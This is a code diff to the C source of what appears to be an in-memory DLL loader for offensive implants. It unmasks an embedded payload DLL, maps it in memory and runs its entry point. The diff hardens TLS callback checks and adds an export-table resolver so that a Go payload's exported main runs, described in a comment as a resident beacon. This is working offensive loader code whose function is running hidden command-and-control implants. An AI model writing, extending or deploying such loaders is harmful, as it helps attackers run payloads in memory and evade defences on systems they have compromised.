@@ -13,7 +13,6 @@ DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD,
 DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
 DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
 DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
-
 char _PICO_[0] __attribute__((section("pico")));
 char _MASK_[0] __attribute__((section("mask")));
 char _DLL_[0] __attribute__((section("dll")));
@@ -235,15 +234,112 @@ static BOOL run_tls_callbacks(IMPORTFUNCS *funcs, DLLDATA *dll, char *dll_dst,
   if (!in_image(dll_dst, dll_size, callback, sizeof(*callback))) {
     return FALSE;
   }
-  for (i = 0; i < 64 && *callback != NULL; i++) {
-    if (!in_image(dll_dst, dll_size, callback, sizeof(*callback)) ||
-        !in_image(dll_dst, dll_size, (void *)*callback, 1)) {
+  for (i = 0; i < 64; i++) {
+    if (!in_image(dll_dst, dll_size, callback, sizeof(*callback))) {
+      return FALSE;
+    }
+    if (*callback == NULL) {
+      return TRUE;
+    }
+    if (!in_image(dll_dst, dll_size, (void *)*callback, 1)) {
       return FALSE;
     }
     (*callback)((PVOID)dll_dst, DLL_PROCESS_ATTACH, NULL);
     callback++;
   }
   return TRUE;
+}
+
+/* dll_export resolves an exported name inside a mapped image. The loader maps
+ * the DLL itself, so GetProcAddress has no module handle to look in. The
+ * directory is passed by value because the parsed headers live in the source
+ * buffer, which is released before the payload's entry points run. */
+static void *dll_export(IMAGE_DATA_DIRECTORY dir, char *base, DWORD size,
+                        const char *name) {
+  IMAGE_EXPORT_DIRECTORY *exports;
+  DWORD *names;
+  WORD *ordinals;
+  DWORD *functions;
+  DWORD i;
+  DWORD forwarded_start;
+  DWORD forwarded_end;
+  SIZE_T entries;
+
+  if (base == NULL || name == NULL || dir.VirtualAddress == 0 ||
+      dir.Size < sizeof(IMAGE_EXPORT_DIRECTORY) || dir.VirtualAddress > size ||
+      dir.Size > size - dir.VirtualAddress) {
+    return NULL;
+  }
+  if (!in_image(base, size, base + dir.VirtualAddress,
+                sizeof(IMAGE_EXPORT_DIRECTORY))) {
+    return NULL;
+  }
+  exports = (IMAGE_EXPORT_DIRECTORY *)(base + dir.VirtualAddress);
+  if (exports->NumberOfNames == 0 || exports->NumberOfFunctions == 0 ||
+      exports->AddressOfNames == 0 || exports->AddressOfNameOrdinals == 0 ||
+      exports->AddressOfFunctions == 0) {
+    return NULL;
+  }
+
+  entries = exports->NumberOfNames;
+  if (entries > size / sizeof(DWORD) ||
+      !in_image(base, size, base + exports->AddressOfNames,
+                entries * sizeof(DWORD))) {
+    return NULL;
+  }
+  names = (DWORD *)(base + exports->AddressOfNames);
+  if (!in_image(base, size, base + exports->AddressOfNameOrdinals,
+                entries * sizeof(WORD))) {
+    return NULL;
+  }
+  ordinals = (WORD *)(base + exports->AddressOfNameOrdinals);
+  entries = exports->NumberOfFunctions;
+  if (entries > size / sizeof(DWORD) ||
+      !in_image(base, size, base + exports->AddressOfFunctions,
+                entries * sizeof(DWORD))) {
+    return NULL;
+  }
+  functions = (DWORD *)(base + exports->AddressOfFunctions);
+  forwarded_start = dir.VirtualAddress;
+  forwarded_end = dir.VirtualAddress + dir.Size;
+
+  for (i = 0; i < exports->NumberOfNames; i++) {
+    DWORD name_rva = names[i];
+    const char *candidate;
+    SIZE_T available;
+    WORD ordinal;
+    DWORD function_rva;
+    size_t j;
+
+    if (name_rva >= size || !in_image(base, size, base + name_rva, 1)) {
+      return NULL;
+    }
+    candidate = (const char *)(base + name_rva);
+    available = size - name_rva;
+    for (j = 0; name[j] != '\0' && j < available && candidate[j] != '\0' &&
+                candidate[j] == name[j];
+         j++) {
+    }
+    if (j >= available || candidate[j] != '\0' || name[j] != '\0') {
+      continue;
+    }
+    ordinal = ordinals[i];
+    if (ordinal >= exports->NumberOfFunctions) {
+      return NULL;
+    }
+    function_rva = functions[ordinal];
+    // A forwarder RVA points into the export directory, not at code. Running
+    // it would execute a string as instructions.
+    if (function_rva >= forwarded_start && function_rva < forwarded_end) {
+      return NULL;
+    }
+    if (function_rva == 0 || function_rva >= size ||
+        !in_image(base, size, base + function_rva, 1)) {
+      return NULL;
+    }
+    return base + function_rva;
+  }
+  return NULL;
 }
 
 void go(void *loader_arguments) {
@@ -258,6 +354,8 @@ void go(void *loader_arguments) {
   DWORD old_protect = 0;
   DWORD dll_size;
   DLLMAIN_FUNC entry_point;
+  IMAGE_DATA_DIRECTORY export_dir;
+  IMAGE_DATA_DIRECTORY *export_dir_ptr;
   RESOURCE *masked_dll;
   RESOURCE *mask_key;
   RESOURCE *args_resource;
@@ -409,11 +507,34 @@ void go(void *loader_arguments) {
                    : NULL;
   dll_arguments = loader_arguments ? (char *)loader_arguments : baked_args;
 
+  /* The parsed headers point into dll_src. Copy the export directory now:
+   * the source is released before the payload's entry points run. */
+  export_dir.VirtualAddress = 0;
+  export_dir.Size = 0;
+  export_dir_ptr = GetDataDirectory(&dll_data, IMAGE_DIRECTORY_ENTRY_EXPORT);
+  if (export_dir_ptr != NULL) {
+    export_dir = *export_dir_ptr;
+  }
+
   /* free the unmasked copy */
   KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);
   dll_src = NULL;
 
   entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, dll_arguments);
+
+  /* Go c-shared DLLs initialise their runtime in the PE entry point but never
+   * execute main (runtime/proc.go: a c-shared program "has a main, but it is
+   * not executed"). A Go payload exports main, so call it after the entry
+   * point returns; a resident beacon blocks here for the life of the process.
+   */
+  {
+    typedef void (*DLLEXPORT_FUNC)(void);
+    DLLEXPORT_FUNC exported_main =
+        (DLLEXPORT_FUNC)dll_export(export_dir, dll_dst, dll_size, "main");
+    if (exported_main != NULL) {
+      exported_main();
+    }
+  }
   return;
 
 fail:
